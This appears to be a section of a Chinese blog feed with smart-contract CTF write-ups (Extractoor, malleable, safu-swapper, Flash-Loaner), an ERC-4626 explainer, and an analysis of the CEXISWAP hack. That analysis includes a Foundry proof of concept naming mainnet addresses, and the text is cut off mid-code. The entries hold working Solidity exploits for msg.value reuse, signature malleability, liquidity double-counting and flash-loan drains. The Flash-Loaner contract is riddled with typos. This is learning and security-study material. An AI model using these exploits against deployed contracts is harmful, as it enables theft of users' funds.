    </entry>
    
    
    
    <entry>
      <title>capture the ether</title>
      <link href="/2024/10/30/capture-the-ether/"/>
      <url>/2024/10/30/capture-the-ether/</url>
      
        <content type="html"><![CDATA[<p>对于随机数，来实现一个更好的理解。</p><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>第一个很简单，答案直接告诉你了，输入即可</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>第二个，暴力破解，关键就是uint8,一个字节的符号，范围0-127，直接暴力破解，循环</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>第三个，有一些拆分，由于哈希计算的是当前的时间戳，所以我们直接引用它的计算哈希的表达式就行了，写一个攻击合约，在同一笔交易中进行就可以了</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>第四个，就要使用控制台了，查询当前的密码，然后输入就可以了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Extractoor</title>
      <link href="/2024/10/28/CTF-Extractoor/"/>
      <url>/2024/10/28/CTF-Extractoor/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Etractoor"><a href="#CTF-Etractoor" class="headerlink" title="CTF-Etractoor"></a>CTF-Etractoor</h1><p>题目源代码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/extractoor">点击</a></p><p>题目要求：<br>已经启动了一场荷兰拍卖，以出售 1_000_000 个 FARM 代币。到目前为止，一个 degen 已经投入了 900 ETH。</p><p>您的任务是从 DutchAuction 合约中窃取至少 90% 的 ETH。</p><p>这次合约就只有一个，实现的是荷兰拍卖，我们要获取eth，所以我们就先看合约中，那个地方可以获得eth,<br>发现commitETH合约中，能够返回eth,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function commitEth(address payable _beneficiary) public payable nonReentrant</span><br><span class="line">  &#123;</span><br><span class="line">      // Get ETH able to be committed</span><br><span class="line">      uint256 ethToTransfer = calculateCommitment(msg.value);</span><br><span class="line"></span><br><span class="line">      /// @notice Accept ETH Payments.</span><br><span class="line">      uint256 ethToRefund = msg.value - ethToTransfer;</span><br><span class="line">      if (ethToTransfer &gt; 0) &#123;</span><br><span class="line">          _addCommitment(_beneficiary, ethToTransfer);</span><br><span class="line">      &#125;</span><br><span class="line">      /// @notice Return any ETH to be refunded.</span><br><span class="line">      if (ethToRefund &gt; 0) &#123;</span><br><span class="line">          _beneficiary.transfer(ethToRefund);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这个合约就是获得用户承诺的金额，计算最大的承诺上限，然后再与用户承诺金额比较，计算退回的eth.</p><p>还有就只再最后结算的时候，如果拍卖部成功，也会退回金额</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdrawTokens(address beneficiary) public nonReentrant &#123;</span><br><span class="line">      if (auctionSuccessful()) &#123;</span><br><span class="line">          require(marketStatus.finalized, &quot;DutchAuction: not finalized&quot;);</span><br><span class="line">          /// @dev Successful auction! Transfer claimed tokens.</span><br><span class="line">          uint256 tokensToClaim = tokensClaimable(beneficiary);</span><br><span class="line">          require(tokensToClaim &gt; 0, &quot;DutchAuction: No tokens to claim&quot;); </span><br><span class="line">          claimed[beneficiary] = claimed[beneficiary]+tokensToClaim;</span><br><span class="line">          IERC20(auctionToken).safeTransfer(beneficiary,tokensToClaim);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">          /// @dev Auction did not meet reserve price.</span><br><span class="line">          /// @dev Return committed funds back to user.</span><br><span class="line">          require(block.timestamp &gt; marketInfo.endTime, &quot;DutchAuction: auction has not finished yet&quot;);</span><br><span class="line">          uint256 fundsCommitted = commitments[beneficiary];</span><br><span class="line">          commitments[beneficiary] = 0; // Stop multiple withdrawals and free some gas</span><br><span class="line"></span><br><span class="line">          (bool success,) = payable(beneficiary).call&#123;value:fundsCommitted&#125;(&#x27;&#x27;);</span><br><span class="line">          require(success, &#x27;ETH_TRANSFER_FAILED&#x27;);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>但是这个函数再finalize函数中才能被使用，而且还只能是管理者身份调用，所以就考虑commitETH函数</p><p>合约本身开头就实现了一个可以多个回调的函数，说明这里是个突破口，然后仔细发现commintETH函数，一直使用的msg.value,如果我们能重复使用这个msg.value就可以重复的使用commintETH,退回更多的eth，为自己创造利润。</p><p>这个题就解决了<br>这个是题解中一部分测试代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// solves the challenge</span><br><span class="line">  function testChallengeExploit() public &#123;</span><br><span class="line">      vm.startPrank(attacker,attacker);</span><br><span class="line"></span><br><span class="line">      bytes memory singleCall = abi.encodeWithSignature(&quot;commitEth(address)&quot;,attacker);</span><br><span class="line">      bytes[] memory data = new bytes[](11);</span><br><span class="line"></span><br><span class="line">      for (uint i; i&lt;11; ++i) &#123;</span><br><span class="line">          data[i] = singleCall;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      bytes memory multiCall = abi.encodeWithSignature(&quot;multicall(bytes[])&quot;,data);</span><br><span class="line">      address(dutchAuction).call&#123;value:98e18&#125;(multiCall);</span><br><span class="line"></span><br><span class="line">      vm.stopPrank();</span><br><span class="line">      validation();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>(还是的了解怎么写代码，不要只知道思路，call的用法要记住)</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-malleable</title>
      <link href="/2024/10/28/CTF-malleable/"/>
      <url>/2024/10/28/CTF-malleable/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-malleable"><a href="#CTF-malleable" class="headerlink" title="CTF-malleable"></a>CTF-malleable</h1><p>题目源代码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/malleable">点击</a></p><p>题目要求是：<br>您一直在黑暗的森林中嗅探，并发现了 TreasureVault 合同。它需要合约所有者的验证签名才能提取选定数量的 ETH。</p><p>您已经记录了用户在之前的 tx 中用于提取一些 ETH 的签名。</p><p>耗尽剩余的合约资金。</p><p>首先先里了解一下签名，这是我有学到的一个新知识。</p><h1 id="签名结构"><a href="#签名结构" class="headerlink" title="签名结构"></a>签名结构</h1><p>v、r 和 s 是以太坊签名的三个组成部分。签名用于验证消息的来源和内容。<br>v 是恢复标识符，通常为 27 或 28，表示签名的版本。<br>r 和 s 是签名的输出，用于确保消息未被篡改。</p><h1 id="签名的生成"><a href="#签名的生成" class="headerlink" title="签名的生成"></a>签名的生成</h1><p>签名包含三个部分：r、s 和 v。<br>r 和 s 是椭圆曲线的点，而 v 表示恢复标识符。<br>计算 s：<br>当生成签名时，消息哈希（通常是交易或信息的哈希）会被用于计算 r 和 s。<br>签名的 s 值通常会在 0 到曲线的参数 n 之间，因此在椭圆曲线中，s 值是可以被认为是模反的。<br>攻击者如何计算 s</p><h2 id="模反性："><a href="#模反性：" class="headerlink" title="模反性："></a>模反性：</h2><p>在椭圆曲线中，存在一个性质，允许将 s 值“反转”。具体来说，对于一个有效的 s，存在另一个有效的 s_，使得 s + s_ ≡ n（模 n），其中 n 是椭圆曲线的一个参数。<br>因此，攻击者可以通过计算：<br>𝑠&#x3D;𝑛−𝑠<br>这里的 n 是 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141，这是 secp256k1 曲线的阶。</p><blockquote><p>它是 secp256k1 曲线的阶（order）。在椭圆曲线密码学中，曲线的阶是指可以在该曲线上生成的点的数量。具体来说：曲线阶 n：ecp256k1 曲线的阶为 n &#x3D;0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141，这是一个非常大的素数。这个值是由 secp256k1 标准定义的，适用于比特币和以太坊等区块链。</p></blockquote><p>模运算的性质：<br>在使用这个曲线时，签名的 s 值通常会在 0 到 n-1 之间。如果 s 超过 n，则会被模运算处理。<br>由于签名可以用不同的 s 值表示同一条消息，因此攻击者可以通过计算 s_ &#x3D; n - s 来生成一个有效的替代签名。</p><h2 id="生成伪造签名："><a href="#生成伪造签名：" class="headerlink" title="生成伪造签名："></a>生成伪造签名：</h2><p> 攻击者将 s 替换为 s_，从而生成一个伪造的签名。此时，v 也可以根据需要调整，以确保签名的有效性。<br>伪造的签名仍然会通过合约的验证，因为它仍然与相同的消息哈希相对应（只是用不同的 s 值）。</p><h2 id="为什么有效"><a href="#为什么有效" class="headerlink" title="为什么有效"></a>为什么有效</h2><p>当合约验证签名时，它只需要确认 r 和 s 是否对应于给定的消息（即哈希）。<br>由于 s_ 和 s 是通过模反得到的，它们仍然是有效的签名，合约将接受它，认为攻击者是有效的请求者。</p><p>所以我们只需要使用s_构造一个假签名就可以了。然后直接实现取款。<br>这是测试合约的一部分：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// solves the challenge</span><br><span class="line">   function testChallengeExploit() public &#123;</span><br><span class="line">       vm.startPrank(attacker,attacker);</span><br><span class="line"></span><br><span class="line">       uint8 v_ = v == 27 ? 28 : 27;</span><br><span class="line">       bytes32 s_ = bytes32(</span><br><span class="line">           uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - </span><br><span class="line">           uint256(s)</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">       treasureVault.sendFundsWithAuth(1e18,0,v_,r,s_);</span><br><span class="line"></span><br><span class="line">       vm.stopPrank();</span><br><span class="line">       validation();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Side-Entrance</title>
      <link href="/2024/10/28/CTF-Side-Entrance/"/>
      <url>/2024/10/28/CTF-Side-Entrance/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Side-Entrance"><a href="#CTF-Side-Entrance" class="headerlink" title="CTF-Side-Entrance"></a>CTF-Side-Entrance</h1><p>题目源代码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/side-entrance">点击</a></p><p>题目要求：<br>有一个 CallOptions 合约，允许用户创建备兑 wETH-USDC 看涨期权。</p><p>他们甚至提供了 functionality 允许用户通过使用 Uniswap 闪电贷在没有任何资金的情况下执行他们购买的期权。</p><p>您的任务是窃取至少 90k USDC。您开始没有资金。</p><p>断更中，关于闪电贷加流动性的题真的很难，准备把uinswap家族学完了再来解题。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-safu-swapper</title>
      <link href="/2024/10/27/CTF-safu-swapper/"/>
      <url>/2024/10/27/CTF-safu-swapper/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-safu-swapper"><a href="#CTF-safu-swapper" class="headerlink" title="CTF-safu-swapper"></a>CTF-safu-swapper</h1><p>题目源代码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/safu-swapper">点击</a></p><p>题目要求：还是获得pool池的全部代币</p><p>这题合约，有俩个，一个主要实现计算，一个主要实现流动性池，<br>首先主要就是看合约流动性提供者，怎样改变流动性，是否有漏洞，果然被发现在移除流动性，发现使用的是 <code> uint amount = IERC20(token).balanceOf(pool);</code> <code> return (amount.mul(units)).div(totalSupply);</code> 而我们在Safupool合约中，并没有发现能改变 <code>baseAmount</code>，<code>tokenAmount</code>,换句话来说，就是在我们以<code>transfer</code>转入代币时合约不会更新<code>baseAmount</code>，<code>tokenAmount</code>，实际上合约是通过 <code>uint amount = IERC20(token).balanceOf(pool);</code>来计算份额，pool会认为已经收到了转账。<br>而增加流动性是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function addLiquidity(uint256 _baseAmount, uint256 _tokenAmount) public returns (uint liquidityUnits) &#123;</span><br><span class="line">       IERC20(BASE).transferFrom(msg.sender,address(this),_baseAmount);</span><br><span class="line">       IERC20(TOKEN).transferFrom(msg.sender,address(this),_tokenAmount);</span><br><span class="line">       liquidityUnits = addLiquidityForMember(msg.sender);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>移除流动性：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function removeAllLiquidity() public returns (uint outputBase, uint outputToken) &#123;</span><br><span class="line">        transfer(address(this),balanceOf(msg.sender)); // transfer all LP units for withdrawing liq</span><br><span class="line">        return removeLiquidityForMember(msg.sender);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>举个例子：<br>假设pooL中有俩个代币，usdc,token;</p><ul><li>usdc :1000</li><li>token :1000</li><li>你的lp ；100<br>然后你向这个pool中转入代币增加流动性，<br>理想上是这样的：</li><li>usdc :1100</li><li>token :1100</li><li>你的lp :110<br>但是由于baseamount,tokenamount,并没有更新<br>所以pool虽然增加了，但是内部状态并没有更新，实际上是这样的：</li><li>usdc:1100</li><li>token:1100</li><li>你的lp :100<br>然后在移除流动性的时候，它是计算的是实际的，移除流动性时，是按照usdc&#x3D;1100,token&#x3D;1100来计算的，然后我们就能获得更多的代币，如果我们重新增添流动性，由于合约中未更新状态，所以刚刚转的100代币，会误以为给攻击者增加lp代币，然后攻击者就再次利用这个lp获得更多的代币。通用名词，双重计算。</li></ul><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface IUniswapV2Pair &#123;</span><br><span class="line">    function swap(</span><br><span class="line">        uint amount0Out, </span><br><span class="line">        uint amount1Out, </span><br><span class="line">        address to, </span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface ISafuPool &#123;</span><br><span class="line">    function addLiquidity(uint256 _baseAmount, uint256 _tokenAmount) external returns (uint);</span><br><span class="line">    function swap(address toToken, uint256 amount) external returns (uint);</span><br><span class="line">    function removeAllLiquidity() external returns (uint, uint);</span><br><span class="line">    function approve(address, uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/// @dev Exploiter contract for SafuPool</span><br><span class="line">contract SwapperExploiter &#123;</span><br><span class="line"></span><br><span class="line">    IUniswapV2Pair pair;</span><br><span class="line">    ISafuPool safuPool;</span><br><span class="line">    IERC20 usdc;</span><br><span class="line">    IERC20 safu;</span><br><span class="line"></span><br><span class="line">    /// @dev Runs exploit, flashloan borrows Uniswap USDC liq</span><br><span class="line">    function runExploit(</span><br><span class="line">        address _uniswapPair, // DAI-USDC pair</span><br><span class="line">        address _safuPool,</span><br><span class="line">        address _usdc,</span><br><span class="line">        address _safu,</span><br><span class="line">        uint256 amount // flashloan amount required</span><br><span class="line">    ) external &#123;</span><br><span class="line">        pair = IUniswapV2Pair(_uniswapPair);</span><br><span class="line">        safuPool = ISafuPool(_safuPool);</span><br><span class="line">        usdc = IERC20(_usdc);</span><br><span class="line">        safu = IERC20(_safu);</span><br><span class="line"></span><br><span class="line">        usdc.approve(address(safuPool),type(uint256).max);</span><br><span class="line">        safu.approve(address(safuPool),type(uint256).max);</span><br><span class="line"></span><br><span class="line">        pair.swap(amount,0,address(this),bytes(&#x27;not empty&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @dev Uniswap flashloan callback</span><br><span class="line">    /// @dev Swaps done in batches b/c extra fees for large swaps</span><br><span class="line">    function uniswapV2Call(</span><br><span class="line">        address _sender, </span><br><span class="line">        uint256 _amount0, // usdc</span><br><span class="line">        uint256 _amount1,</span><br><span class="line">        bytes calldata _data</span><br><span class="line">    ) external &#123;</span><br><span class="line">        require(msg.sender == address(pair), &#x27;callback&#x27;);</span><br><span class="line"></span><br><span class="line">        for (uint i=0; i&lt;5; ++i) &#123;</span><br><span class="line">            safuPool.swap(address(safu),8_000*1e18); // get some SAFU tokens</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 safuAmount = safu.balanceOf(address(this));</span><br><span class="line">        safuPool.addLiquidity(safuAmount, safuAmount); // add equal parts tokens for liq</span><br><span class="line"></span><br><span class="line">        for (uint i=0; i&lt;5; ++i) &#123;</span><br><span class="line">            safuPool.swap(address(safu),8_000*1e18); // get more SAFU tokens</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        safuAmount = safu.balanceOf(address(this));</span><br><span class="line">        safu.transfer(address(safuPool),safuAmount); // transfer all SAFU</span><br><span class="line">        usdc.transfer(address(safuPool),600_000*1e18); // transfer large amount of USDC</span><br><span class="line"></span><br><span class="line">        safuPool.removeAllLiquidity(); // effectively double counts the transfers done earlier</span><br><span class="line">        safuPool.addLiquidity(0,0); // get LP which is the double counted</span><br><span class="line">        safuPool.removeAllLiquidity(); // get base funds for the double counted LP</span><br><span class="line"></span><br><span class="line">        uint256 amountPerRound = safu.balanceOf(address(this)) / 10;</span><br><span class="line"></span><br><span class="line">        for (uint i=0; i&lt;10; ++i) &#123;</span><br><span class="line">            safuPool.swap(address(usdc), amountPerRound); // dump remaining SAFU for USDC</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 loanPlusInterest = (_amount0*(10**18)*1000/997/(10**18))+1; // exact amount owed</span><br><span class="line">        usdc.transfer(msg.sender,loanPlusInterest); // pay back flashloan</span><br><span class="line">        usdc.transfer(tx.origin,usdc.balanceOf(address(this))); // lazy</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="补充：流动池的LP计算"><a href="#补充：流动池的LP计算" class="headerlink" title="补充：流动池的LP计算"></a>补充：流动池的LP计算</h1><p>流动性池的 LP 代币计算<br>流动性池的总资产：</p><p>假设流动性池中有 baseAmount（例如 SAFU）和 tokenAmount（例如 USDC）。<br>在正常情况下，LP 代币的铸造与流动性池的资产状态是直接关联的。<br>添加流动性时的 LP 代币计算：</p><p>当用户向池中添加流动性时，会计算应铸造的 LP 代币数量，公式通常是：<br>新 LP 代币数量&#x3D;存入资产&#x2F;总资产×现有 LP 代币总数</p><p>这确保了流动性池的每个流动性提供者都根据他们的贡献获得相应比例的 LP 代币。<br>移除流动性时的 LP 代币计算：<br>当调用 removeAllLiquidity() 时，合约会根据持有的 LP 代币数量来计算用户可以提取的基础资产：<br>提取的 SAFU&#x3D;用户持有的 LP 代币&#x2F;总 LP 代币×当前 SAFU 总量<br>提取的 USDC&#x3D; 用户持有的 LP 代币&#x2F;总 LP 代币×当前 USDC 总量</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC4626</title>
      <link href="/2024/10/27/ERC4626/"/>
      <url>/2024/10/27/ERC4626/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC4626"><a href="#ERC4626" class="headerlink" title="ERC4626"></a>ERC4626</h1><h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><p>ERC-4626 是优化和统一收益资金库技术参数的标准。 它为表示单个底层 ERC-20 代币的份额的代币化收益资金库提供标准应用程序接口。 ERC-4626 还概述了使用 ERC-20 的代币化资金库的可选扩展，提供存款、提取代币和读取余额的基本功能。</p><p>它主要是运用在收益金库中</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>asset：由 Vault 管理的基础 Token。 具有由相应的 EIP-20 合约定义的单位。<br>share：Vault 的 token。具有标的资产比率 在 Mint &#x2F; Deposit &#x2F; Withdraw&#x2F;redeem （由 Vault 定义） 时兑换。<br>fee：Vault 向用户收取的资产或份额数量。可以存在费用 存款、收益、AUM、提款或 Vault 规定的任何其他内容。<br>滑点：广告股价与经济现实之间的任何差异 存款到金库或从金库取款，不计入费用。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>asset :<code>function asset() public view returns (address assetTokenAddress)</code><br>函数返回用于资金库记账，存款，取款的带代币地址。</p><p>totalAsset:<code>function convertToShares(uint256 assets) public view returns (uint256 shares)</code><br>函数返回资金库持有的资金总量</p><p>converToShare:<code>function convertToShares(uint256 assets) public view returns (uint256 shares)</code><br>函数返回shares的数量，该数量将由资金库兑换为提供的assets数量</p><p>convertToAssets :<code>function convertToAssets(uint256 shares) public view returns (uint256 assets)</code><br>函数返回assets数量，该数量由资金库兑换成为提供的shares数量</p><p>maxDeposit:function <code>maxDeposit(address receiver) public view returns (uint256 maxAssets)</code><br>函数返回receiver的一次deposit调用中可以存入的最大资产数量</p><p>previewDeposit:<code>function previewDeposit(uint256 assets) public view returns (uint256 shares)</code><br>函数允许用户模拟他们在当前区块的存取效果</p><p>deposit：<code>function deposit(uint256 assets, address receiver) public returns (uint256 shares)</code><br>函数将代币asserts存入资金库，并将shares的所有权授予receiver</p><p>maxMint :<code>function maxMint(address receiver) public view returns (uint256 maxShares)</code><br>函数返回receiver在单次mintd调用中可以铸造的最大份额】</p><p>previewMint：<code>function maxMint(address receiver) public view returns (uint256 maxShares)</code><br>函数允许用户在当前区块模拟他们铸币效果</p><p>mint：<code>function mint(uint256 shares, address receiver) public returns (uint256 assets)</code><br>函数通过存入代币的assets,将shares资金库份额准确的铸造搭到receiver。</p><p>maxWithdraw:<code>function maxWithdraw(address owner) public view returns (uint256 maxAssets)</code><br>函数返回可以通过单次 withdraw 调用从 owner 余额中提取的最大标的资产数量。</p><p>previewWithdraw:<code>function previewWithdraw(uint256 assets) public view returns (uint256 shares)</code><br>函数允许用户模拟他们在当前区块取款的效果</p><p>withdraw:<code>function withdraw(uint256 assets, address receiver, address owner) public returns (uint256 shares)</code><br>函数从 owner 烧录 shares，并将 assets 代币从资金库准确发送到 receiver。</p><p>maxRedeem:<code>function maxRedeem(address owner) public view returns (uint256 maxShares)</code><br>函数返回可以通过 redeem 调用从 owner 余额中赎回的最大份额。</p><p>previewRedeem:<code>function previewRedeem(uint256 shares) public view returns (uint256 assets)</code><br>函数允许用户在当前区块模拟他们的赎回效果。</p><p>redeem:<code>function redeem(uint256 shares, address receiver, address owner) public returns (uint256 assets)</code><br>函数从 owner 赎回特定数量的 shares 并将底层代币的 assets 从资金库发送到 receiver。</p><p>totalSupply：<code>function totalSupply() public view returns (uint256)</code><br>返回流通中未赎回的资金库份额总数。</p><p>balanceOf：<code>function balanceOf(address owner) public view returns (uint256)</code><br>返回 owner 当前拥有的资金库份额总量。</p><h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>使用 deposit()，你指定要存入多少资产，函数将计算要发送给你的股份数量。<br>使用 mint()，你指定想要多少股份，函数将计算从你那里转移多少 ERC20 资产。</p><p>withdraw 和 redeem 分别是 deposit 和 mint 的逆操作。</p><p>使用 deposit，你指定要交易的资产数量，合约计算你将获得多少股份。<br>使用 mint，你指定想要的股份数量，合约计算要从你那里取走多少资产。<br>同样，<br>使用 withdraw，你可以指定想从合约中提取多少资产，合约将计算你需要销毁多少股份。<br>使用 redeem，你指定想要销毁多少股份，合约将计算要返还给你的资产数量。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Flash-Loaner</title>
      <link href="/2024/10/27/CTF-Flash-Loaner/"/>
      <url>/2024/10/27/CTF-Flash-Loaner/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Flash-Loaner"><a href="#CTF-Flash-Loaner" class="headerlink" title="CTF-Flash-Loaner"></a>CTF-Flash-Loaner</h1><p>题目源码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/flash-loaner">点击</a></p><p>题目要求：<br>FlashLoaner 合约接受用户的资金以促进闪电贷，其中他们收取少量费用。这笔费用作为收益提供给储户。</p><p>您的任务是从该合约中抽走 99%+ 的用户资金。您开始时没有资金。</p><p>这题看起来就是很闪电贷。但是阅读完后，并没有发现一些漏洞，突破口就是这个代码：<code>  IFlashCallback(msg.sender).flashCallback(fee, data);</code>可是我们的回执函数能做些什么呢，除了还款我想不到其他方向了</p><p>再次审阅合约，发现这个闪电贷是继承ERC4626合约的，意味着它也可以实现存取功能，所以思路就打开了，首先借入一些代币，在调用deposit函数，存入闪电贷中，满足还款条件，然后再执行withdraw函数，又将代币撤回</p><p>攻击合约：</p><pre><code>//SPDX-License-Identifier: MITpragma solidity^0.8.17;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;interface IUniswapV2Pair&#123;     function swap(        uint amount0Out,         uint amount1Out,         address to,         bytes calldata data    ) external;&#125;interface ILoan&#123;    function deposit(uint256 assets, address receiver) external returns (uint256);    function redeem(uint256 shares,address receiver,address owner) external returns (uint256);    function flash(address recipient,uint256 amount,bytes calldata data) external;&#125;contract Hack&#123;    IUniswapV2Pair pair;    ILoan loaner;    IERC20 udsc;    constructor(address _pair,address _loaner,address udsc)&#123;        pair = IUniswapV2Pair (_pair);        loaner = Loaner(_loaner);        udsc = IERC20(_udsc);         usdc.approve(address(loaner), type(uint).max);    &#125;    function pwn () exteranl &#123;        pair.swap(100_000e18.0.address(this),new btyes(1));        udsc.transfer(msg.sender,udsc.banlanceOf(address(tihs)));    &#125;    function uniswapV2Call (address _address,uint256 amount0,uint256 amount1,bytes memory data) exteranl&#123;        loaner.flash(address(this),udsc.balanceOf(address(loaner))-1,new bytes(0));        loaner.redeem(loaner.balanceOf(address(this)),address(this),address(this));        udsc.transfer(address(pair),(amount0*103/100)+1);    &#125;    function flashCallback(uint256 fee,byte calldata) external&#123;        loaner.deposit(100_1000e18,address(this));        udsc.transfer(address(loaner),fee);    &#125;&#125;完结。这个题和前面的ctf-bonding-curve还是有点一样的。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CEXISWAP攻击事件分析</title>
      <link href="/2024/10/27/CEXISWAP%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/27/CEXISWAP%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>cexiswap被黑客攻击，黑客从中盗取了3w的USDT。（CEXISWAP是一个去中心化的多链交易所，通过贸易管道技术在DEX和CEX之间桥接流动性）</p><p>TX：0xede72a74d8398875b42d92c550539d72c830d3c3271a7641ee1843dc105de59e</p><h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们通过phalcon来看。攻击合约直接调用受害者的initialize()，使自己成为了admin，再调用受害者的upgradeToAndCall()，再upgradeToAndCall()中受害者再次delegatecall攻击合约的0x1de24bbf函数。</p><p>很明显，受害者为对initialize()进行访问限制，导致被攻击。</p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import&quot;forge-std/Test.sol&quot;;</span><br><span class="line">import&quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">// Attacker : https://etherscan.io/address/0x060c169c4517d52c4be9a1dd53e41a3328d16f04</span><br><span class="line">// Attack Contract : https://etherscan.io/address/0x8c425ee62d18b65cc975767c27c42de548d133a1</span><br><span class="line">// Vulnerable Contract : https://etherscan.io/address/0xb8a5890d53df78dee6182a6c0968696e827e3305</span><br><span class="line">// Attack Tx : 0xede72a74d8398875b42d92c550539d72c830d3c3271a7641ee1843dc105de59e</span><br><span class="line"></span><br><span class="line">interface ICEXISWAP &#123;</span><br><span class="line">    function initialize(</span><br><span class="line">        string memory name,</span><br><span class="line">        string memory ticker,</span><br><span class="line">        address _treasuryWallet,</span><br><span class="line">        address _communityWallet,</span><br><span class="line">        address _admin,</span><br><span class="line">        address _strategy</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    function upgradeToAndCall(</span><br><span class="line">        address newImplementation,</span><br><span class="line">        bytes memory data</span><br><span class="line">    ) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CEXISWAPTest is Test&#123;</span><br><span class="line">    ICEXISWAP constant cexiswap = ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);</span><br><span class="line">    IUSDT constant usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);</span><br><span class="line">    Exploiter public exploiter;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        vm.createSelectFork(&quot;mainnet&quot;, 18182605);</span><br><span class="line">        vm.label(address(cexiswap), &quot;CEXISWAP&quot;);</span><br><span class="line">        vm.label(address(usdt), &quot;USDT&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testexploit() public&#123;</span><br><span class="line">        exploiter = new Exploiter();</span><br><span class="line">        exploiter.exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploiter&#123;</span><br><span class="line">    ICEXISWAP constant cexiswap = ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);</span><br><span 